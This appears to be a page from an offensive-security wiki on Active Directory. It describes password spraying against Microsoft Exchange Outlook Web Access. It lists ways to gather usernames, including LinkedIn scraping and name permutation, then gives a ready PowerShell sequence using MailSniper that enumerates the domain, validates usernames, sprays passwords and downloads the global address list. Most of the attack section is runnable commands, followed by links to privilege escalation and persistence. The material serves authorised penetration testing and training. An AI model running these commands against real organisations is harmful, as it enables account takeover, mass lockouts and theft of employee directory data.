
# 📧 Email Password Spraying
---

> [!CAUTION]
> **Please RTFM carefully.**
>
> This technique can lock a large amount of - *even all* - domain accounts. Be careful to not perform to much attempts on the same usernames or ensure to know the enforced password policy first.

#### 🤓 RTFM

This technique consists in leveraging a Microsoft Exchange instance to perform either [user spraying](/docs/active-directory/recon/user-spraying.html), [brute-forcing](/docs/active-directory/initial-access/brute-force.html) or [password spraying](/docs/active-directory/initial-access/password-spraying.html).

#### 📝 Prerequisites

* Microsoft Exchange is deployed in the target domain.
* Outlook Web Access is reachable.

#### 🛠️ Do it!

You can use [MailSniper](https://github.com/dafthack/MailSniper) PowerShell module for every steps.

> [!NOTE]
> To build your `usernames.txt` list, several ways are possible:
> - If you already have an initial authenticated access to the domain, you can [retrieve domain users](/docs/active-directory/enumeration/users.html).
> - Otherwise, you can perform [user spraying](/docs/active-directory/recon/user-spraying.html) to validate usernames exist in the domain. 
> - Finally, you can use OSINT tools like [linkedin2username](https://github.com/initstring/linkedin2username).
>
> Usernames often have the same nomenclature like `f.lastname` or `firstname.lastname`. To generate possible usernames based on first name and last name, use [namemash.py](https://gist.github.com/superkojiman/11076951). Anyway, you should first ensure to know the correct terminology before starting password spraying. 

```powershell
Import-Module ./MailSniper.ps1

# Enumerate the target.
Invoke-DomainHarvestOWA -ExchHostname mail.$Domain

# Spray usernames.
Invoke-UsernameHarvestOWA -ExchHostname mail.$Domain -Domain $Domain -UserList username.txt -OutFile .\correct.txt

# Once you identified correct usernames, spray passwords.
Invoke-PasswordSprayOWA -ExchHostname mail.$Domain -UserList .\correct.txt -Password $Password

# If you manage to discover valid credentials, you can download the global address list.
Get-GlobalAddressList -ExchHostname mail.$Domain -UserName $Domain\$Username -Password $Password -OutFile .\list.out
```

#### 🏆 What's next?

- If it is your first authenticated access to the domain, let's [enumerate](/docs/active-directory/methodology.html#-enumeration) it!
- [Active Directory privilege escalation](/docs/active-directory/methodology.html#-privilege-escalation) if you gained access to a low privileged domain account.
- [Active Directory persistence](/docs/active-directory/methodology.html#-persistence) if you found a privileged domain account credentials.
- Otherwise, try another method to get an [initial access](/docs/active-directory/methodology.html#-initial-access).